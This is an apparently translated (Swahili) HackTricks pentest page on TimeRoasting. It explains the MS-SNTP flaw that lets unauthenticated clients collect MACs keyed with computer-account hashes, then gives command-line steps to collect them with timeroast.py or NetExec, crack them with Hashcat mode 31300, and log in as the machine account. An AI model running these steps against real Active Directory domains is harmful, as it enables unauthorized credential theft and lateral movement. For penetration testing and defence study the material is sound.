# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting hutumia vibaya legacy MS-SNTP authentication extension. Katika MS-SNTP, client anaweza kutuma request yenye baiti 68 inayojumuisha computer account RID yoyote; domain controller hutumia NTLM hash (MD4) ya computer account hiyo kama key ya kukokotoa MAC juu ya response na kuirudisha.<sup>[[1]](#references)</sup> Attackers wanaweza kukusanya MS-SNTP MACs bila authentication na kuzipasua offline (Hashcat mode 31300) ili kurejesha passwords za computer accounts.<sup>[[2]](#references)</sup>

Angalia sehemu ya 3.1.5.1 "Authentication Request Behavior" na 4 "Protocol Examples" katika official MS-SNTP spec kwa maelezo zaidi.<sup>[[1]](#references)</sup>
![TimeRoasting: Angalia sehemu ya 3.1.5.1 "Authentication Request Behavior" na 4 "Protocol Examples" katika official MS-SNTP spec kwa maelezo zaidi](../../images/Pasted%20image%2020250709114508.png)
Wakati ADM element ya ExtendedAuthenticatorSupported ni false, client hutuma request yenye baiti 68 na hujumuisha RID katika least significant 31 bits za Key Identifier subfield ya authenticator.<sup>[[1]](#references)</sup>

> Ikiwa ADM element ya ExtendedAuthenticatorSupported ni false, client MUST construct Client NTP Request message. Urefu wa Client NTP Request message ni baiti 68. Client huweka Authenticator field ya Client NTP Request message kama ilivyoelezwa katika sehemu ya 2.2.1, ikiandika least significant 31 bits za RID value katika least significant 31 bits za Key Identifier subfield ya authenticator, kisha ikiandika Key Selector value katika most significant bit ya Key Identifier subfield.<sup>[[1]](#references)</sup>

Kutoka sehemu ya 4 (Protocol Examples):

> Baada ya kupokea request, server huthibitisha kuwa ukubwa wa message iliyopokelewa ni baiti 68. Ikidhaniwa kuwa ukubwa wa message iliyopokelewa ni baiti 68, server hutoa RID kutoka kwenye message iliyopokelewa. Server huitumia kuita NetrLogonComputeServerDigest method (kama ilivyoainishwa katika [MS-NRPC] section 3.5.4.8.2) ili kukokotoa crypto-checksums na kuchagua crypto-checksum kulingana na most significant bit ya Key Identifier subfield kutoka kwenye message iliyopokelewa, kama ilivyoainishwa katika sehemu ya 3.2.5. Kisha server hutuma response kwa client, ikiweka Key Identifier field kuwa 0 na Crypto-Checksum field kuwa crypto-checksum iliyokokotolewa.<sup>[[1]](#references)</sup>

Crypto-checksum inategemea MD5 (angalia 3.2.5.1.1) na inaweza kupasuliwa offline, hivyo kuwezesha roasting attack.<sup>[[1]](#references)</sup>

## Jinsi ya Ku-attack

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scripts by Tom Tervoort<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Shambulio la vitendo (unauth) kwa NetExec + Hashcat

- NetExec inaweza ku-enumerate na kukusanya MS-SNTP MACs za computer RIDs bila authentication, na kuchapisha $sntp-ms$ hashes zilizo tayari kwa cracking:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack offline kwa kutumia Hashcat mode 31300 (MS-SNTP MAC):<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Nakala wazi iliyopatikana inalingana na nenosiri la akaunti ya kompyuta. Ijaribu moja kwa moja kama akaunti ya mashine kwa kutumia Kerberos (-k) wakati NTLM imezimwa:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Vidokezo vya uendeshaji
- Hakikisha usawazishaji sahihi wa muda kabla ya Kerberos: `sudo ntpdate <dc_fqdn>`
- Ikihitajika, tengeneza krb5.conf kwa AD realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Map RIDs kwa principals baadaye kupitia LDAP/BloodHound mara tu unapokuwa na authenticated foothold.

## Marejeleo

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec – official docs](https://www.netexec.wiki/)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
